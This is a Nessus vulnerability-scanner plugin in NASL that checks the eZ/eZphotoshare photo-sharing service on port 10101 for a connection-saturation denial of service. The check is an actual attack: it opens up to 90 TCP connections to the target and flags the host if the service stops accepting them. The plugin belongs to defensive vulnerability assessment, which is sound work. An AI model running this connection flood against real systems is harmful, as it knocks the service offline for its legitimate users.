#
# This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
# based on Michel Arboi work
#
# Ref: Dr_insane
#
# This script is released under the GNU GPLv2

# Changes by Tenable:
# - Revised plugin title (6/16/09)


include("compat.inc");

if(description)
{
  script_id(14682);
  script_version("$Revision: 1.5 $");
  script_bugtraq_id(11129);
  script_xref(name:"OSVDB", value:"9728");

  script_name(english:"eZ/eZphotoshare Connection Saturation Remote DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote application is vulnerable to a denial of service attack." );
 script_set_attribute(attribute:"description", value:
"The remote host runs eZ/eZphotoshare, a service for sharing and exchanging 
digital photos.

This version is vulnerable to a denial of service attack.

An attacker could prevent the remote service from accepting requests 
from users by establishing quickly multiple connections from the same host." );
 script_set_attribute(attribute:"solution", value:
"Upgrade to the latest version of this software." );
 script_set_attribute(attribute:"cvss_vector", value:"CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P" );

script_end_attributes();

  script_summary(english:"Checks for denial of service in eZ/eZphotoshare");
  script_category(ACT_DENIAL);
  script_copyright(english:"This script is Copyright (C) 2004-2009 David Maciejak");
  script_family(english:"Windows");
  script_require_ports(10101);
  exit(0);
}


if ( safe_checks() ) exit(0);

port = 10101;

if(get_port_state(port))
{ 
  soc = open_sock_tcp(port);
  if (! soc) exit(0);
  
  s[0] = soc;

  #80 connections should be enough, we just add few one :)
  for (i = 1; i < 90; i = i+1)
  {
    soc = open_sock_tcp(port);
    if (! soc)
    {
      security_warning(port);
      for (j = 0; j < i; j=j+1) close(s[j]);
    }
    s[i] = soc;
  }
  for (j = 0; j < i; j=j+1) close(s[j]);
}
exit(0);
